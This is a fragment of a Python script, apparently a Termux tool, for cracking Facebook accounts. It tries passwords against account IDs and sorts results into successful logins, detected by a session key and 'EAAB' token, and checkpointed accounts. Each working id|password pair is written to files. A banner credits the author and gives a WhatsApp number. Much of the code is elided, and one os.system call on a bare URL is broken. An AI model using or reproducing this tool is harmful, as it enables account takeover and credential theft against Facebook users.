...
┗━━━━━﷽━━━━━┛
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1m BD-TERMUX
\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m01759916221
\x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1m TONU-143
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #MR-GREEN
	...
	if farhan in ['1','01']:
		...
		os.system("https://youtube.com/channel/UCDHbwleGe-QEc6YOeKka19g")
		exit()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [TONU-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [TONU-ok] %s|%s        '%(h,idf,pw))
...
if __name__=='__main__':
	...
	os.system("xdg-open https://www.facebook.com/SADHARON.USER.143")
	menu()
